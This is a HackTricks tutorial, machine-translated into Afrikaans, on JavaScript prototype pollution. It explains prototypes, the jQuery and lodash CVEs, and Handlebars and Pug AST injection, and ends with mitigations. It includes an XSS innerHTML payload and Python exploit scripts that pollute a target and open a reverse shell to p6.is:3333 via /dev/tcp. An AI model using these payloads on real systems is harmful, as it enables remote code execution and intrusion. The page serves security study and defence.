# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Objects in JavaScript <a href="#id-053a" id="id-053a"></a>

Objekte in JavaScript is essensieel versamelings van sleutel-waardepare, bekend as eienskappe. 'n Objek kan geskep word met behulp van `Object.create` met `null` as 'n argument om 'n le√´ objek te produseer. Hierdie metode maak die skepping van 'n objek moontlik sonder enige ge√´rfde eienskappe.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
'n Le√´ voorwerp is soortgelyk aan 'n le√´ woordeboek, voorgestel as `{}`.

### Funksies en Klasse in JavaScript

In JavaScript is klasse en funksies nou verbonde, met funksies wat dikwels as konstrukteurs vir klasse dien. Ten spyte van JavaScript se gebrek aan inheemse klasse-ondersteuning, kan konstrukteurs klasse-gedrag naboots.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipes in JavaScript

JavaScript maak die wysiging, byvoeging, of verwydering van prototipe eienskappe tydens uitvoering moontlik. Hierdie buigsaamheid maak die dinamiese uitbreiding van klasfunksionaliteite moontlik.

Funksies soos `toString` en `valueOf` kan verander word om hul gedrag te wysig, wat die aanpasbare aard van JavaScript se prototipe stelsel demonstreer.

## Erfenis

In prototipe-gebaseerde programmering word eienskappe/metodes deur objekte van klasse ge√´rf. Hierdie klasse word geskep deur eienskappe/metodes by te voeg aan 'n instansie van 'n ander klas of aan 'n le√´ objek.

Dit moet opgemerk word dat wanneer 'n eienskap by 'n objek wat as die prototipe vir ander objekte dien (soos `myPersonObj`) gevoeg word, die erfenisobjekte toegang tot hierdie nuwe eienskap verkry. Hierdie eienskap word egter nie outomaties vertoon tensy dit uitdruklik aangeroep word nie.

## \_\_proto\_\_ besoedeling <a href="#id-0d0a" id="id-0d0a"></a>

## Verkenning van Prototipe Besoedeling in JavaScript

JavaScript objekte word gedefinieer deur sleutel-waarde pare en erf van die JavaScript Objek prototipe. Dit beteken dat die verandering van die Objek prototipe alle objekte in die omgewing kan be√Ønvloed.

Laat ons 'n ander voorbeeld gebruik om dit te illustreer:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Toegang tot die Object-prototipe is moontlik deur:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Deur eienskappe by die Object-prototipe by te voeg, sal elke JavaScript-voorwerp hierdie nuwe eienskappe erf:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototipe besoedeling

Vir 'n scenario waar `__proto__` gebruik beperk is, is dit 'n alternatief om 'n funksie se prototipe te wysig:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Dit affekteer slegs voorwerpe wat geskep is vanaf die `Vehicle` konstrukteur, wat hulle die `beep`, `hasWheels`, `honk`, en `isElectric` eienskappe gee.

Twee metodes om JavaScript voorwerpe globaal te affekteer deur middel van prototipe besoedeling sluit in:

1. Die `Object.prototype` direk besoedel:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Besoedeling van die prototipe van 'n konstrukteur vir 'n algemeen gebruikte struktuur:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Na hierdie operasies kan elke JavaScript-voorwerp die `goodbye` en `greet` metodes uitvoer.

## Besoedeling van ander voorwerpe

### Van 'n klas na Object.prototype

In 'n scenario waar jy 'n spesifieke voorwerp kan besoedel en jy moet na `Object.prototype` gaan, kan jy dit soek met iets soos die volgende kode:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Array elemente besoedeling

Merk op dat as jy eienskappe van voorwerpe in JS kan besoedel, as jy toegang het om 'n array te besoedel, kan jy ook **waardes van die array besoedel** wat toeganklik is **deur indekse** (let wel dat jy nie waardes kan oorskryf nie, so jy moet indekse besoedel wat op een of ander manier gebruik word maar nie geskryf word nie).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elemente besoedeling

Wanneer 'n HTML-element deur JS gegenereer word, is dit moontlik om die **`innerHTML`** eienskap te **oorwryf** om dit **willekeurige HTML-kode** te laat skryf. [Idee en voorbeeld van hierdie skrywe](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Voorbeelde

### Basiese Voorbeeld

'n Prototipevervuiling vind plaas as gevolg van 'n fout in die toepassing wat die oorskrywing van eienskappe op `Object.prototype` toelaat. Dit beteken dat aangesien die meeste voorwerpe hul eienskappe van `Object.prototype` aflei.

Die maklikste voorbeeld is om 'n waarde by te voeg aan 'n **onbepaalde attribuut van 'n voorwerp** wat gaan nagegaan word, soos:
```javascript
if (user.admin) {
```
Indien die eienskap **`admin` ongedefinieer is**, is dit moontlik om misbruik te maak van 'n PP en dit na Waar te stel met iets soos:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Die meganisme agter hierdie betrokkenheid behels die manipulasie van eienskappe sodat as 'n aanvaller beheer het oor sekere insette, hulle die prototipe van alle voorwerpe in die aansoek kan wysig. Hierdie manipulasie behels tipies die instelling van die `__proto__` eienskap, wat in JavaScript sinoniem is met die direkte wysiging van 'n voorwerp se prototipe.

Die toestande waarin hierdie aanval suksesvol uitgevoer kan word, soos uiteengesit in 'n spesifieke [studie](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), sluit in:

* Die uitvoering van 'n herhalende samenvoeging.
* Die definisie van eienskappe gebaseer op 'n pad.
* Kloning van voorwerpe.

### Oorskryf funksie
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Besoedeling tot RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Kli√´ntkant prototype besoedeling tot XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Prototype besoedelingsaanval deur jQuery $ .extend

[Vir verdere besonderhede, kyk na hierdie artikel](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) In jQuery kan die `$ .extend`-funksie lei tot prototype besoedeling as die diep kopie-funksie verkeerd gebruik word. Hierdie funksie word gewoonlik gebruik vir kloning van voorwerpe of die saamvoeging van eienskappe van 'n verstekvoorwerp. Wanneer dit egter verkeerd gekonfigureer is, kan eienskappe bedoel vir 'n nuwe voorwerp aan die prototipe toegewys word. Byvoorbeeld:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Hierdie kwesbaarheid, ge√Ødentifiseer as CVE-2019-11358, illustreer hoe 'n diep kopie onbedoeld die prototipe kan wysig, wat kan lei tot potensi√´le veiligheidsrisiko's, soos ongemagtigde admin-toegang as eienskappe soos `isAdmin` nagegaan word sonder behoorlike bestaansverifikasie.

### CVE-2018-3721, CVE-2019-10744: Prototipe besoedelingsaanval deur lodash

[Vir verdere besonderhede kyk na hierdie artikel](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) het soortgelyke prototipe besoedelingskwesbaarhede (CVE-2018-3721, CVE-2019-10744) ondervind. Hierdie kwessies is aangespreek in weergawe 4.17.11.

### 'n Ander handleiding met CVE's

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Gereedskap om Prototipe Besoedeling te ontdek

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Burp Suite-uitbreiding ontwerp om serverkant prototipe besoedelingskwesbaarhede in webtoepassings op te spoor en te analiseer. Hierdie gereedskap outomatiseer die proses van skandering van versoek om potensi√´le prototipe besoedelingskwessies te identifiseer. Dit maak gebruik van bekende gadgets - metodes om prototipe besoedeling te benut om skadelike aksies uit te voer - wat spesifiek fokus op Node.js-biblioteke.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Hierdie uitbreiding identifiseer serverkant prototipe besoedelingskwesbaarhede. Dit maak gebruik van tegnieke wat beskryf word in die [server side prototype pollution](https://portswigger.net/research/server-side-prototype-pollution).

### AST Prototipe Besoedeling in NodeJS

NodeJS maak uitgebreide gebruik van Abstract Syntax Trees (AST) in JavaScript vir funksionaliteite soos templaatmotors en TypeScript. Hierdie afdeling ondersoek die kwesbaarhede wat verband hou met prototipe besoedeling in templaatmotors, spesifiek Handlebars en Pug.

#### Handlebars Kwesbaarheidsanalise

Die Handlebars templaatmotor is vatbaar vir 'n prototipe besoedelingsaanval. Hierdie kwesbaarheid spruit voort uit spesifieke funksies binne die `javascript-compiler.js` l√™er. Die `appendContent`-funksie, byvoorbeeld, kombineer `pendingContent` as dit teenwoordig is, terwyl die `pushSource`-funksie `pendingContent` na `undefined` herstel nadat die bron bygevoeg is.

**Uitbuitingsproses**

Die uitbuiting maak gebruik van die AST (Abstract Syntax Tree) wat deur Handlebars geproduseer word, deur hierdie stappe te volg:

1. **Manipulasie van die Parser**: Aanvanklik dwing die parser, via die `NumberLiteral`-node, dat waardes numeries moet wees. Prototipe besoedeling kan hierdie beperking omseil, wat die invoeging van nie-numeriese strings moontlik maak.
2. **Hantering deur die Kompileerder**: Die kompileerder kan 'n AST-objek of 'n string-templaat verwerk. As `input.type` gelyk is aan `Program`, word die invoer as vooraf gepars behandel, wat uitgebuit kan word.
3. **Invoeging van Kode**: Deur manipulasie van `Object.prototype` kan arbitr√™re kode in die templaatfunksie ingevoeg word, wat kan lei tot afgele√´ kode-uitvoering.

'n Voorbeeld wat die uitbuiting van die Handlebars-kwesbaarheid demonstreer:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Hierdie kode wys hoe 'n aanvaller arbitr√™re kode in 'n Handlebars-sjabloon kan inspuit.

**Eksterne Verwysing**: 'n Probleem wat verband hou met prototipe besoedeling is gevind in die 'flat' biblioteek, soos hier beskryf: [Probleem op GitHub](https://github.com/hughsk/flat/issues/105).

**Eksterne Verwysing**: [Probleem wat verband hou met prototipe besoedeling in die 'flat' biblioteek](https://github.com/hughsk/flat/issues/105)

Voorbeeld van 'n prototipe besoedeling uitbuiting in Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug Kwesbaarheid

Pug, nog 'n templaat-enjin, loop 'n soortgelyke risiko van prototipe besoedeling. Gedetailleerde inligting is beskikbaar in die bespreking oor [AST-injeksie in Pug](https://blog.p6.is/AST-Injection/#Pug).

Voorbeeld van prototipe besoedeling in Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Voorkomende Maatre√´ls

Om die risiko van prototipe besoedeling te verminder, kan die volgende strategie√´ toegepas word:

1. **Objek Onveranderlikheid**: Die `Object.prototype` kan onveranderlik gemaak word deur `Object.freeze` toe te pas.
2. **Invoervalidasie**: JSON invoere moet streng gevalideer word teen die toepassing se skema.
3. **Veilige Saamvoegingsfunksies**: Die onveilige gebruik van herhalende saamvoegingsfunksies moet vermy word.
4. **Prototipe-loos Objekte**: Objekte sonder prototipe-eienskappe kan geskep word deur `Object.create(null)` te gebruik.
5. **Gebruik van Map**: In plaas van `Object`, moet `Map` gebruik word vir die stoor van sleutel-waarde pare.
6. **Biblioteekopdaterings**: Sekuriteitspleisters kan ingesluit word deur biblioteke gereeld op te dateer.
7. **Linter en Statische Analisewerkstukke**: Gebruik gereedskap soos ESLint met toepaslike invoegtoepassings om prototipe besoedeling kwesbaarhede op te spoor en te voorkom.
8. **Kode-oorsig**: Implementeer deeglike kode-oorsigte om potensi√´le risiko's rakende prototipe besoedeling te identifiseer en te verhelp.
9. **Sekuriteitsopleiding**: Edukeer ontwikkelaars oor die risiko's van prototipe besoedeling en die beste praktyke vir die skryf van veilige kode.
10. **Gebruik van Biblioteke met Omsigtigheid**: Wees versigtig wanneer jy derdeparty biblioteke gebruik. Assesseer hul sekuriteitspostuur en hersien hul kode, veral di√© wat objekte manipuleer.
11. **Uitvoeringsbeskerming**: Stel uitvoeringsbeskermingsmeganismes in soos die gebruik van sekuriteitsgefokusde npm-pakkette wat prototipe besoedeling aanvalle kan opspoor en voorkom.

## Verwysings

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
